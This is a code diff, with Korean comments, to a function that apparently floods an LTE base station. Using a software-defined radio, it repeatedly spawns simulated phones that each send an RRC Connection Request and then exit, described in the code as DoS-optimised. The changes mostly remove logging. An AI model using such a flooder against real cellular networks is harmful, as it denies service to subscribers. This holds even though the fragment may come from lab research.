@@ -135,9 +135,7 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
         logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {template_config}")
         return
     
-    logger.info(f"템플릿 config: {template_config}")
-    logger.info(f"UE ID는 1부터 계속 증가하며 공격 시작 (하나의 USRP 사용)...")
-    logger.info("공격 모드: RRC Connection Request까지만 전송 후 즉시 종료 (DoS 최적화)")
+    logger.info("Flooding 공격 시작...")
     
     ue_id = 1
     current_process = None
@@ -150,9 +148,6 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
         loop_count = 0
         while running_flag is None or running_flag():
             loop_count += 1
-            # 첫 번째 루프에서 상태 확인
-            if loop_count == 1:
-                logger.info("공격 루프 시작...")
             
             # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
             if current_process is None or current_process.poll() is not None:
@@ -177,20 +172,9 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     )
                     process_start_time = time.time()
                     
-                    # 첫 번째 UE 실행 시 상세 정보 출력
-                    if ue_id == 1:
-                        logger.info(f"첫 번째 UE 실행:")
-                        logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
-                        logger.info(f"  로그 파일: {current_log_file}")
-                        logger.info(f"  프로세스 PID: {current_process.pid}")
-                        logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
-                        logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
-                        logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
-                        logger.info(f"프로세스 시작 완료. 로그 파일 생성 대기 중...")
-                    
+                    # 간단한 메시지만 출력
+                    logger.info(f"config_{ue_id} 보냄")
                     ue_id += 1
-                    if (ue_id - 1) % 50 == 0:
-                        logger.info(f"진행 중... UE {ue_id - 1} 실행")
                 except Exception as e:
                     logger.error(f"UE {ue_id} 실행 오류: {e}")
                     ue_id += 1
@@ -202,19 +186,9 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                 # 프로세스가 종료되었는지 먼저 확인
                 poll_result = current_process.poll()
                 if poll_result is not None:
-                    # 프로세스가 종료됨
+                    # 프로세스가 종료됨 (로그 출력 제거)
                     elapsed = time.time() - process_start_time if process_start_time else 0
                     return_code = current_process.returncode
-                    logger.info(f"UE 프로세스가 종료됨 (경과: {elapsed:.2f}초, 종료 코드: {return_code})")
-                    if return_code != 0:
-                        logger.warning(f"UE 프로세스가 비정상 종료 (종료 코드: {return_code})")
-                        # stderr 확인
-                        try:
-                            stderr_output = current_process.stderr.read().decode('utf-8', errors='ignore') if current_process.stderr else ""
-                            if stderr_output:
-                                logger.warning(f"프로세스 stderr: {stderr_output[:500]}")
-                        except:
-                            pass
                     # 로그 위치 정보 정리
                     if current_log_file in last_log_position:
                         del last_log_position[current_log_file]
@@ -233,14 +207,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                             else:
                                 last_log_position[current_log_file] = 0
                             
-                            # 새로 추가된 내용만 읽기
+                            # 새로 추가된 내용만 읽기 (로그는 출력하지 않고 키워드 체크만)
                             new_content = f.read()
                             if new_content:
-                                # 새 로그 출력
-                                for line in new_content.split('\n'):
-                                    if line.strip():
-                                        logger.info(f"[UE {ue_id-1}] {line}")
-                                # 마지막 위치 업데이트
+                                # 마지막 위치 업데이트 (로그 출력은 하지 않음)
                                 last_log_position[current_log_file] = f.tell()
                             
                             # 전체 로그 내용도 읽어서 키워드 체크 (파일 처음부터)
@@ -344,7 +314,6 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                     elapsed = time.time() - process_start_time if process_start_time else 0
                     # 프로세스 상태 확인
                     if current_process.poll() is not None:
-                        logger.warning(f"프로세스가 종료됨 (로그 파일 생성 전, 경과: {elapsed:.2f}초, 종료 코드: {current_process.returncode})")
                         # 로그 위치 정보 정리
                         if current_log_file in last_log_position:
                             del last_log_position[current_log_file]
@@ -352,15 +321,12 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         process_start_time = None
                         current_log_file = None
                         continue
-                    elif elapsed > 1.0 and int(elapsed) % 2 == 0:  # 2초마다 한 번씩 로그
-                        logger.info(f"로그 파일 대기 중: {current_log_file} (경과: {elapsed:.1f}초, 프로세스 실행 중)")
             
             # 최후의 수단: 타임아웃 체크 (로그 기반 종료가 실패했을 때만)
             if current_process and process_start_time:
                 elapsed = time.time() - process_start_time
                 if elapsed > max_process_wait_time:
                     # 타임아웃: 다음 UE로 이동 (로그에서 종료 조건을 찾지 못한 경우)
-                    logger.warning(f"UE 타임아웃 (경과: {elapsed:.2f}초, 로그 기반 종료 실패) → 다음 UE로 이동")
                     if current_process.poll() is None:
                         current_process.terminate()
                         try:
